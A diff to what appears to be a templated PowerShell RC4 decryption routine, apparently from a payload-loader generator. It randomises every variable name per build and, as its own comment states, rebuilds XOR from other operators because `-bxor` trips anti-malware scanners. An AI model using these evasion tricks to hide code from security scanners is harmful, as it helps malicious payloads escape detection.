@@ -1,40 +1,42 @@
 {#- Since `-bxor` triggers some anti malware scanners, use this trick -#}
 function {{symbol_name("xor")}} {
-    return [Byte]((-bnot($args[0] -band $args[1])) -band (-bnot((-bnot $args[0]) -band (-bnot $args[1]))))
+    param (${{symbol_name('A')}}, ${{symbol_name('B')}});
+    return [Byte]((-bnot(${{symbol_name('A')}} -band ${{symbol_name('B')}})) -band (-bnot((-bnot ${{symbol_name('A')}}) -band (-bnot ${{symbol_name('B')}}))))
 };
 
 {#- Text book implementation of RC4 -#}
 
 function {{symbol_name("Decrypt-RC4")}} {
-    $s = New-Object Byte[] 256;
-    $k = New-Object Byte[] 256;
+    param (${{symbol_name('data')}}, ${{symbol_name('key')}});
+    ${{symbol_name('s')}} = New-Object Byte[] 256;
+    ${{symbol_name('k')}} = New-Object Byte[] 256;
 
-    for ($i = 0; $i -lt 256; $i++)
+    for (${{symbol_name('i')}} = 0; ${{symbol_name('i')}} -lt 256; ${{symbol_name('i')}}++)
     {
-        $s[$i] = [Byte]$i;
-        $k[$i] = $args[1][$i % $args[1].Length];
+        ${{symbol_name('s')}}[${{symbol_name('i')}}] = [Byte]${{symbol_name('i')}};
+        ${{symbol_name('k')}}[${{symbol_name('i')}}] = ${{symbol_name('key')}}[${{symbol_name('i')}} % ${{symbol_name('key')}}.Length];
     };
 
-    $j = 0;
-    for ($i = 0; $i -lt 256; $i++)
+    ${{symbol_name('j')}} = 0;
+    for (${{symbol_name('i')}} = 0; ${{symbol_name('i')}} -lt 256; ${{symbol_name('i')}}++)
     {
-        $j = ($j + $s[$i] + $k[$i]) % 256;
-        $m = $s[$i];
-        $s[$i] = $s[$j];
-        $s[$j] = $m;
+        ${{symbol_name('j')}} = (${{symbol_name('j')}} + ${{symbol_name('s')}}[${{symbol_name('i')}}] + ${{symbol_name('k')}}[${{symbol_name('i')}}]) % 256;
+        ${{symbol_name('m')}} = ${{symbol_name('s')}}[${{symbol_name('i')}}];
+        ${{symbol_name('s')}}[${{symbol_name('i')}}] = ${{symbol_name('s')}}[${{symbol_name('j')}}];
+        ${{symbol_name('s')}}[${{symbol_name('j')}}] = ${{symbol_name('m')}};
     };
 
-    $i = $j = 0;
-    for ($x = 0; $x -lt $args[0].Length; $x++)
+    ${{symbol_name('i')}} = ${{symbol_name('j')}} = 0;
+    for (${{symbol_name('x')}} = 0; ${{symbol_name('x')}} -lt ${{symbol_name('data')}}.Length; ${{symbol_name('x')}}++)
     {
-        $i = ($i + 1) % 256;
-        $j = ($j + $s[$i]) % 256;
-        $m = $s[$i];
-        $s[$i] = $s[$j];
-        $s[$j] = $m;
-        [int]$t = ($s[$i] + $s[$j]) % 256;
-        $args[0][$x] = {{symbol_name("xor")}} $args[0][$x] $s[$t];
+        ${{symbol_name('i')}} = (${{symbol_name('i')}} + 1) % 256;
+        ${{symbol_name('j')}} = (${{symbol_name('j')}} + ${{symbol_name('s')}}[${{symbol_name('i')}}]) % 256;
+        ${{symbol_name('m')}} = ${{symbol_name('s')}}[${{symbol_name('i')}}];
+        ${{symbol_name('s')}}[${{symbol_name('i')}}] = ${{symbol_name('s')}}[${{symbol_name('j')}}];
+        ${{symbol_name('s')}}[${{symbol_name('j')}}] = ${{symbol_name('m')}};
+        [int]${{symbol_name('t')}} = (${{symbol_name('s')}}[${{symbol_name('i')}}] + ${{symbol_name('s')}}[${{symbol_name('j')}}]) % 256;
+        ${{symbol_name('data')}}[${{symbol_name('x')}}] = ${{symbol_name("xor")}} ${{symbol_name('data')}}[${{symbol_name('x')}}] ${{symbol_name('s')}}[${{symbol_name('t')}}];
     };
 
-    $args[0]
+    ${{symbol_name('data')}}
 };
